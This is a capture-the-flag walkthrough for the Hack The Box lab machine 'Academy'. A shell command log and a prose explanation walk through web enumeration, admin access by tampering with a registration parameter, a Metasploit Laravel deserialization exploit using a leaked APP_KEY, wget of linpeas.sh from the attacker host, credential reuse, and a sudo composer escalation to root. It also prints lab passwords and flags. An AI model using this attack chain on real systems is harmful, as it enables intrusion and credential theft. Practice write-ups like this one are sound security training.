# Academy - Easy

```shell
rustscan -a 10.10.10.215 --range 0-65535 --ulimit 5000 -- -sV

sudo vim /etc/hosts

feroxbuster -u http://academy.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

sudo vim /etc/hosts
#map another domain to IP

msfconsole -q

use exploit/unix/http/laravel_token_unserialize_exec

options

set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=

set RHOSTS dev-staging-01.academy.htb

set LHOST 10.10.14.7

run
#we get a shell session

whoami
#www-data

python3 -c 'import pty;pty.spawn("/bin/bash")'

cd /tmp

#on attacker machine
python3 -m http.server

#on shell session
wget http://10.10.14.7:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#check web files
cd /var/www/html

ls -la

cd academy

ls -la

cat .env
#we find a password here

ls /home
#get list of users

ssh 21y4d@10.10.10.215

ssh ch4p@10.10.10.215

ssh cry0l1t3@10.10.10.215
#this works

cat user.txt

cd /tmp

#get linpeas.sh again and check for privesc
./linpeas.sh
#check passwords in audit logs section for creds

su mrb3n
#use the creds that were found

sudo -l
#can run /usr/bin/composer
#run sudo exploit for composer from GTFObins
#and get root shell
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 8.2p1 Ubuntu
  * 80 - http - Apache httpd 2.4.41 (Ubuntu)
  * 33060 - mysqlx

Visiting http://10.10.10.215 redirects us to http://academy.htb, so we will have to add the IP to our /etc/hosts file first.

We can enumerate the web directories using feroxbuster.

Now /register.php and /login.php are the two visible directories in our webpage; we will try to register and login to see if we can access any other content.

There are other enumerated directories such as /images and /Modules_files.

There are two webpages /config.php and /admin.php, we can check them as well.

We can try brute-forcing but it does not work.

Navigating back to /register.php, we can try to register another user, but this time intercept the request; we can see that in the register request, there is a 'userid' parameter which is assigned as 0.

If we change the 'userid' to 1 and then forward the intercepted request, we can then login as the same user in /admin.php

This takes us to /admin-page.php; it contains a list of items - including a subdomain 'dev-staging-01.academy.htb'.

We can add this to our /etc/hosts file and then visit the subdomain.

This page contains an UnexpectedValueException error; we can see that it uses laravel.

It also contains a section full of details related to the environment used.

Now, we can search for exploits related to laravel in Metasploit; we find one named 'laravel_token_unserialize_exec'.

Upon running the exploit, we get a command shell session as www-data.

We can check for privesc using linpeas; it does not give anything helpful.

We can check the web files in /var/wwww/html.

In the web files, in /academy/.env, we find a password "mySup3rP4s5w0rd!!".

We can check for password reuse by other users present, which can be checked by 'ls /home', and we will try to login using SSH.

After attempting with the users, we can see that the password is reused by cry0l1t3 user.

After getting the user flag, we can check for privesc using linpeas again.

Now, linpeas shows passwords in audit logs, and from that, we can get the creds mrb3n:mrb3n_Ac@d3my!

Using this, we can switch to user mrb3n, and enumerate for more privesc vectors.

By using 'sudo -l', we can see that /usr/bin/composer can be run as all users.

We can get the sudo exploit from GTFObins for composer, run it to get root.
```

1. User flag - 105f396f6f7134ef36335cc28e4e23c1

2. Root flag - a4aea0d9bbe5e5e108b8a59d0470895b
